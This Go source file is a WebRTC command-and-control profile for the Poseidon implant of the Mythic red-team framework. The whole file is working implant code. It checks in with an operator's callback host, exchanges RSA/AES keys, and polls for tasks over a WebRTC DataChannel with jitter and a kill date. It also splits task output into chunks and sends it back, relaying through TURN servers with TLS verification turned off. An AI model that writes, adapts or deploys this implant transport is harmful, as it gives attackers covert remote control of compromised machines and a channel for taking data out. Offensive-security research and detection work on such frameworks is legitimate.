//go:build webrtc
// +build webrtc

// WebRTC profile wrapper for Poseidon.
//
// Transport: one-shot HTTPS POST of the SDP offer, then a persistent
// RTCDataChannel (SCTP/DTLS) for all tasking. Each agent SendMessage
// is a synchronous round-trip over the DataChannel: send one Mythic
// blob, block waiting for exactly one reply.
//
// Build-time variable is `webrtc_initial_config` — a base64-encoded
// JSON blob stamped by Poseidon's builder from the selected C2
// parameters. This matches the pattern used by http.go, websocket.go,
// dns.go, etc. (superseding the old per-field var pattern.)
package profiles

import (
	"context"
	"crypto/rsa"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"math/rand"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/crypto"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// Build-time substitution. Stamped by Poseidon's builder with a base64
// encoding of the JSON-marshalled profile parameters.
var webrtc_initial_config string

type WebRTCInitialConfig struct {
	CallbackHost           string
	CallbackPort           uint
	SignalingURI           string
	DataChannelLabel       string
	STUNServers            string
	TURNServer             string
	TURNUsername           string
	TURNCredential         string
	CallbackInterval       uint
	CallbackJitter         uint
	Killdate               string
	EncryptedExchangeCheck bool
	AESPSK                 string
}

func (e *WebRTCInitialConfig) UnmarshalJSON(data []byte) error {
	alias := map[string]interface{}{}
	if err := json.Unmarshal(data, &alias); err != nil {
		return err
	}
	if v, ok := alias["callback_host"]; ok {
		e.CallbackHost, _ = v.(string)
	}
	if v, ok := alias["callback_port"]; ok {
		if f, ok := v.(float64); ok {
			e.CallbackPort = uint(f)
		}
	}
	if v, ok := alias["signaling_uri"]; ok {
		e.SignalingURI, _ = v.(string)
	}
	if v, ok := alias["datachannel_label"]; ok {
		e.DataChannelLabel, _ = v.(string)
	}
	if v, ok := alias["stun_servers"]; ok {
		e.STUNServers, _ = v.(string)
	}
	if v, ok := alias["turn_server"]; ok {
		e.TURNServer, _ = v.(string)
	}
	if v, ok := alias["turn_username"]; ok {
		e.TURNUsername, _ = v.(string)
	}
	if v, ok := alias["turn_credential"]; ok {
		e.TURNCredential, _ = v.(string)
	}
	if v, ok := alias["callback_interval"]; ok {
		if f, ok := v.(float64); ok {
			e.CallbackInterval = uint(f)
		}
	}
	if v, ok := alias["callback_jitter"]; ok {
		if f, ok := v.(float64); ok {
			e.CallbackJitter = uint(f)
		}
	}
	if v, ok := alias["killdate"]; ok {
		e.Killdate, _ = v.(string)
	}
	if v, ok := alias["encrypted_exchange_check"]; ok {
		if b, ok := v.(bool); ok {
			e.EncryptedExchangeCheck = b
		}
	}
	if v, ok := alias["AESPSK"]; ok {
		e.AESPSK, _ = v.(string)
	}
	return nil
}

// C2WebRTC is the Poseidon Profile built on top of the pion WebRTC Transport.
type C2WebRTC struct {
	CallbackHost  string
	CallbackPort  int
	Interval      int
	Jitter        int
	Key           string
	RsaPrivateKey *rsa.PrivateKey

	ExchangingKeys  bool
	FinishedStaging bool

	Killdate time.Time

	transport *Transport

	ShouldStop            bool
	stoppedChannel        chan bool
	interruptSleepChannel chan bool
	sendMu                sync.Mutex
}

func (e C2WebRTC) MarshalJSON() ([]byte, error) {
	return json.Marshal(map[string]interface{}{
		"CallbackHost":  e.CallbackHost,
		"CallbackPort":  e.CallbackPort,
		"Interval":      e.Interval,
		"Jitter":        e.Jitter,
		"EncryptionKey": e.Key,
		"KillDate":      e.Killdate,
	})
}

func init() {
	initialConfigBytes, err := base64.StdEncoding.DecodeString(webrtc_initial_config)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("error decoding initial webrtc config, exiting: %v\n", err))
		os.Exit(1)
	}
	cfg := WebRTCInitialConfig{}
	if err := json.Unmarshal(initialConfigBytes, &cfg); err != nil {
		utils.PrintDebug(fmt.Sprintf("error unmarshaling initial webrtc config, exiting: %v\n", err))
		os.Exit(1)
	}

	killDateString := fmt.Sprintf("%sT00:00:00.000Z", cfg.Killdate)
	killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("error parsing webrtc killdate, exiting: %v\n", err))
		os.Exit(1)
	}

	var stun []string
	for _, s := range strings.Split(cfg.STUNServers, ",") {
		s = strings.TrimSpace(s)
		if s != "" {
			stun = append(stun, s)
		}
	}

	interval := int(cfg.CallbackInterval)
	if interval < 0 {
		interval = 0
	}
	jitter := int(cfg.CallbackJitter)
	if jitter < 0 {
		jitter = 0
	}

	tr, err := New(Config{
		AgentUUID:        UUID,
		CallbackHost:     cfg.CallbackHost,
		CallbackPort:     int(cfg.CallbackPort),
		SignalingURI:     cfg.SignalingURI,
		DataChannelLabel: cfg.DataChannelLabel,
		STUNServers:      stun,
		TURNServer:       cfg.TURNServer,
		TURNUsername:     cfg.TURNUsername,
		TURNCredential:   cfg.TURNCredential,
		ReconnectBase:    time.Duration(interval) * time.Second,
		ReconnectJitter:  jitter,
		InsecureTLS:      true,
	})
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("webrtc: failed to construct transport: %v\n", err))
		// Register a disabled profile so the binary still runs and other
		// egress profiles can start; Start() will bail out cleanly.
		tr = nil
	}

	profile := &C2WebRTC{
		CallbackHost:          cfg.CallbackHost,
		CallbackPort:          int(cfg.CallbackPort),
		Interval:              interval,
		Jitter:                jitter,
		Key:                   cfg.AESPSK,
		ExchangingKeys:        cfg.EncryptedExchangeCheck,
		Killdate:              killDateTime,
		transport:             tr,
		ShouldStop:            true,
		stoppedChannel:        make(chan bool, 1),
		interruptSleepChannel: make(chan bool, 1),
	}

	RegisterAvailableC2Profile(profile)
}

// --- Profile interface -------------------------------------------------------

func (c *C2WebRTC) ProfileName() string { return "webrtc" }
func (c *C2WebRTC) IsP2P() bool         { return false }

func (c *C2WebRTC) IsRunning() bool {
	return !c.ShouldStop
}

func (c *C2WebRTC) Start() {
	if !c.ShouldStop {
		return
	}
	if c.transport == nil {
		utils.PrintDebug("webrtc: transport is nil, Start() exiting\n")
		return
	}
	c.ShouldStop = false
	defer func() {
		c.stoppedChannel <- true
	}()
	for {
		if c.ShouldStop {
			return
		}
		checkIn := c.CheckIn()
		if strings.Contains(checkIn.Status, "success") {
			for {
				if c.ShouldStop {
					return
				}
				msg := responses.CreateMythicPollMessage()
				// Send task responses individually so each DataChannel
				// message stays small enough for SCTP. A 121 KB ps output
				// batched into one poll → ~185 KB on the wire → kills the
				// SCTP session. Sending each response (re-chunked to 32 KB)
				// individually keeps wire size under ~50 KB.
				if msg.Responses != nil && len(*msg.Responses) > 0 {
					utils.PrintDebug(fmt.Sprintf("webrtc: poll has %d task responses to send individually\n", len(*msg.Responses)))
					for i, resp := range *msg.Responses {
						utils.PrintDebug(fmt.Sprintf("webrtc: response[%d] task=%s output=%d bytes completed=%v\n", i, resp.TaskID, len(resp.UserOutput), resp.Completed))
						c.sendResponseChunked(resp)
					}
					msg.Responses = nil
				}
				// Remaining get_tasking poll carries only delegates, socks,
				// rpfwd, alerts, interactive — typically small.
				encResponse, err := json.Marshal(msg)
				if err != nil {
					utils.PrintDebug(fmt.Sprintf("webrtc: failed to marshal poll: %v\n", err))
					c.Sleep()
					continue
				}
				utils.PrintDebug(fmt.Sprintf("webrtc: sending get_tasking poll (%d bytes)\n", len(encResponse)))
				resp := c.SendMessage(encResponse)
				if len(resp) > 0 {
					taskResp := structs.MythicMessageResponse{}
					if err := json.Unmarshal(resp, &taskResp); err != nil {
						utils.PrintDebug(fmt.Sprintf("webrtc: failed to unmarshal task resp: %v\n", err))
						c.Sleep()
						continue
					}
					responses.HandleInboundMythicMessageFromEgressChannel <- taskResp
				} else {
					// Poll failed — transport is likely reconnecting.
					// Enforce a minimum 2s backoff even at interval=0
					// to avoid a tight spin while the supervisor re-dials.
					utils.PrintDebug("webrtc: poll got nil reply, backing off 2s\n")
					select {
					case <-c.interruptSleepChannel:
					case <-time.After(2 * time.Second):
					}
					continue
				}
				c.Sleep()
			}
		}
		c.Sleep()
	}
}

func (c *C2WebRTC) Stop() {
	if c.ShouldStop {
		return
	}
	c.ShouldStop = true
	if c.transport != nil {
		_ = c.transport.Close()
	}
	utils.PrintDebug("webrtc: issued stop\n")
	<-c.stoppedChannel
	utils.PrintDebug("webrtc: fully stopped\n")
}

func (c *C2WebRTC) Sleep() {
	select {
	case <-c.interruptSleepChannel:
	case <-time.After(time.Second * time.Duration(c.GetSleepTime())):
	}
}

func (c *C2WebRTC) GetSleepInterval() int { return c.Interval }
func (c *C2WebRTC) GetSleepJitter() int   { return c.Jitter }
func (c *C2WebRTC) GetKillDate() time.Time {
	return c.Killdate
}

func (c *C2WebRTC) GetSleepTime() int {
	if c.ShouldStop {
		return -1
	}
	if c.Jitter > 0 {
		jit := float64(rand.Int()%c.Jitter) / float64(100)
		jitDiff := float64(c.Interval) * jit
		if int(jit*100)%2 == 0 {
			return c.Interval + int(jitDiff)
		}
		return c.Interval - int(jitDiff)
	}
	return c.Interval
}

func (c *C2WebRTC) SetSleepInterval(interval int) string {
	if interval < 0 {
		return fmt.Sprintf("Sleep interval not updated, %d is not >= 0", interval)
	}
	c.Interval = interval
	go func() { c.interruptSleepChannel <- true }()
	return fmt.Sprintf("Sleep interval updated to %ds\n", interval)
}

func (c *C2WebRTC) SetSleepJitter(jitter int) string {
	if jitter < 0 || jitter > 100 {
		return fmt.Sprintf("Jitter not updated, %d is not between 0 and 100", jitter)
	}
	c.Jitter = jitter
	go func() { c.interruptSleepChannel <- true }()
	return fmt.Sprintf("Jitter updated to %d%%\n", jitter)
}

func (c *C2WebRTC) SetEncryptionKey(newKey string) {
	c.Key = newKey
	c.ExchangingKeys = false
}

func (c *C2WebRTC) GetConfig() string {
	jsonString, err := json.MarshalIndent(c, "", "  ")
	if err != nil {
		return fmt.Sprintf("Failed to get config: %v\n", err)
	}
	return string(jsonString)
}

func (c *C2WebRTC) UpdateConfig(parameter, value string) {
	switch parameter {
	case "Interval":
		if n, err := strconv.Atoi(value); err == nil {
			c.Interval = n
			go func() { c.interruptSleepChannel <- true }()
		}
	case "Jitter":
		if n, err := strconv.Atoi(value); err == nil {
			c.Jitter = n
			go func() { c.interruptSleepChannel <- true }()
		}
	case "EncryptionKey":
		c.Key = value
	case "Killdate":
		killDateString := fmt.Sprintf("%sT00:00:00.000Z", value)
		if kd, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString); err == nil {
			c.Killdate = kd
		}
	}
}

func (c *C2WebRTC) GetPushChannel() chan structs.MythicMessage { return nil }

// --- round-trip plumbing -----------------------------------------------------

// SendMessage sends one encrypted+UUID-prefixed Mythic message over the
// DataChannel and blocks for exactly one reply. Serialized under sendMu
// because the server replies one-to-one per send.
func (c *C2WebRTC) SendMessage(sendData []byte) []byte {
	c.sendMu.Lock()
	defer c.sendMu.Unlock()

	if c.ShouldStop || c.transport == nil {
		return nil
	}

	if len(c.Key) != 0 {
		sendData = c.encryptMessage(sendData)
	}
	if GetMythicID() != "" {
		sendData = append([]byte(GetMythicID()), sendData...)
	} else {
		sendData = append([]byte(UUID), sendData...)
	}
	if time.Now().After(c.Killdate) {
		utils.PrintDebug("webrtc: past killdate, exiting\n")
		os.Exit(1)
	}

	// Transport.SendToC2 base64-encodes into the envelope — pass raw bytes.
	utils.PrintDebug(fmt.Sprintf("webrtc: SendMessage sending %d bytes\n", len(sendData)))
	if err := c.transport.SendToC2(sendData); err != nil {
		utils.PrintDebug(fmt.Sprintf("webrtc: send error: %v\n", err))
		// Do NOT call IncrementFailedConnection here. The WebRTC transport
		// supervisor goroutine handles reconnection autonomously. Calling
		// IncrementFailedConnection triggers Poseidon's egress failover
		// (profile.go:StartNextEgress) which writes to an unprotected map
		// from a new goroutine — concurrent map writes crash the agent.
		return nil
	}

	// Block up to interval+60s for a reply. The supervisor will kick
	// off reconnects on its own if the channel dies.
	waitCtx, cancel := context.WithTimeout(context.Background(), time.Duration(c.Interval+60)*time.Second)
	defer cancel()
	raw, err := c.transport.Recv(waitCtx)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("webrtc: recv error (waited %ds): %v\n", c.Interval+60, err))
		return nil
	}
	utils.PrintDebug(fmt.Sprintf("webrtc: recv got %d bytes\n", len(raw)))

	// Transport.Recv already base64-decoded the envelope — raw is the
	// Mythic response bytes: UUID (36 bytes) + possibly-encrypted payload.
	if len(raw) < 36 {
		utils.PrintDebug("webrtc: reply shorter than 36 bytes\n")
		return nil
	}
	raw = raw[36:]
	if len(c.Key) != 0 {
		raw = c.decryptMessage(raw)
		if len(raw) == 0 {
			return nil
		}
	}
	return raw
}

func (c *C2WebRTC) CheckIn() structs.CheckInMessageResponse {
	if c.ExchangingKeys {
		for !c.NegotiateKey() {
			if c.ShouldStop {
				return structs.CheckInMessageResponse{}
			}
		}
	}
	for {
		if c.ShouldStop {
			return structs.CheckInMessageResponse{}
		}
		checkin := CreateCheckinMessage()
		raw, err := json.Marshal(checkin)
		if err != nil {
			c.Sleep()
			continue
		}
		resp := c.SendMessage(raw)
		response := structs.CheckInMessageResponse{}
		if err := json.Unmarshal(resp, &response); err != nil {
			utils.PrintDebug(fmt.Sprintf("webrtc: checkin unmarshal err: %v\n", err))
			c.Sleep()
			continue
		}
		if len(response.ID) != 0 {
			SetMythicID(response.ID)
			SetAllEncryptionKeys(c.Key)
			return response
		}
		c.Sleep()
	}
}

// NegotiateKey performs EKE. Mirrors http.go's implementation.
func (c *C2WebRTC) NegotiateKey() bool {
	sessionID := utils.GenerateSessionID()
	pub, priv := crypto.GenerateRSAKeyPair()
	c.RsaPrivateKey = priv

	initMessage := structs.EkeKeyExchangeMessage{}
	initMessage.Action = "staging_rsa"
	initMessage.SessionID = sessionID
	initMessage.PubKey = base64.StdEncoding.EncodeToString(pub)

	raw, err := json.Marshal(initMessage)
	if err != nil {
		return false
	}

	resp := c.SendMessage(raw)
	if c.ShouldStop {
		return false
	}
	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}
	if err := json.Unmarshal(resp, &sessionKeyResp); err != nil {
		utils.PrintDebug(fmt.Sprintf("webrtc: eke response unmarshal err: %v\n", err))
		return false
	}

	encryptedSessionKey, _ := base64.StdEncoding.DecodeString(sessionKeyResp.SessionKey)
	decryptedKey := crypto.RsaDecryptCipherBytes(encryptedSessionKey, c.RsaPrivateKey)
	c.Key = base64.StdEncoding.EncodeToString(decryptedKey)
	SetAllEncryptionKeys(c.Key)
	if len(sessionKeyResp.UUID) > 0 {
		SetMythicID(sessionKeyResp.UUID)
	} else {
		return false
	}
	c.ExchangingKeys = false
	c.FinishedStaging = true
	return true
}

// webrtcChunkSize caps UserOutput per DataChannel message. 32 KB raw →
// ~50 KB on the wire after encrypt + UUID + base64 + JSON envelope.
// Larger messages fragment into too many SCTP/UDP datagrams; any packet
// loss triggers retransmission cascades that kill the session.
const webrtcChunkSize = 32768

// sendResponseChunked sends a single task Response to Mythic, splitting
// UserOutput into webrtcChunkSize pieces so each DataChannel message
// stays small enough for SCTP. Each chunk is sent as its own
// post_response round-trip.
func (c *C2WebRTC) sendResponseChunked(resp structs.Response) {
	output := resp.UserOutput
	if len(output) <= webrtcChunkSize {
		utils.PrintDebug(fmt.Sprintf("webrtc: task %s output %d bytes fits in one chunk\n", resp.TaskID, len(output)))
		c.sendSingleResponse(resp)
		return
	}
	// Multiple chunks needed. Defer Completed to the last chunk so
	// Mythic sees all output before marking the task done.
	isCompleted := resp.Completed
	totalChunks := (len(output) + webrtcChunkSize - 1) / webrtcChunkSize
	utils.PrintDebug(fmt.Sprintf("webrtc: task %s output %d bytes -> %d chunks of %d\n", resp.TaskID, len(output), totalChunks, webrtcChunkSize))
	for offset := 0; offset < len(output); offset += webrtcChunkSize {
		end := offset + webrtcChunkSize
		if end > len(output) {
			end = len(output)
		}
		isLast := end >= len(output)
		chunkNum := offset/webrtcChunkSize + 1
		var chunk structs.Response
		if offset == 0 {
			// First chunk carries full metadata (status, file browser, etc.)
			chunk = resp
			chunk.UserOutput = output[0:end]
			chunk.Completed = isLast && isCompleted
		} else {
			// Subsequent chunks carry only TaskID + output slice.
			chunk = structs.Response{TaskID: resp.TaskID}
			chunk.UserOutput = output[offset:end]
			chunk.Completed = isLast && isCompleted
		}
		utils.PrintDebug(fmt.Sprintf("webrtc: sending chunk %d/%d (%d bytes) completed=%v\n", chunkNum, totalChunks, end-offset, chunk.Completed))
		if !c.sendSingleResponse(chunk) {
			utils.PrintDebug(fmt.Sprintf("webrtc: chunk %d/%d failed, aborting remaining chunks\n", chunkNum, totalChunks))
			return
		}
	}
}

// sendSingleResponse wraps a Response in a post_response MythicMessage,
// sends it over the DataChannel, and feeds the reply back to the
// response handler. Returns true on success, false if the send failed.
func (c *C2WebRTC) sendSingleResponse(resp structs.Response) bool {
	msg := structs.MythicMessage{
		Action:    "post_response",
		Responses: &[]structs.Response{resp},
	}
	raw, err := json.Marshal(msg)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("webrtc: failed to marshal response chunk: %v\n", err))
		return false
	}
	reply := c.SendMessage(raw)
	if len(reply) == 0 {
		return false
	}
	taskResp := structs.MythicMessageResponse{}
	if err := json.Unmarshal(reply, &taskResp); err != nil {
		utils.PrintDebug(fmt.Sprintf("webrtc: failed to unmarshal response reply: %v\n", err))
		return false
	}
	responses.HandleInboundMythicMessageFromEgressChannel <- taskResp
	return true
}

func (c *C2WebRTC) encryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesEncrypt(key, msg)
}

func (c *C2WebRTC) decryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesDecrypt(key, msg)
}
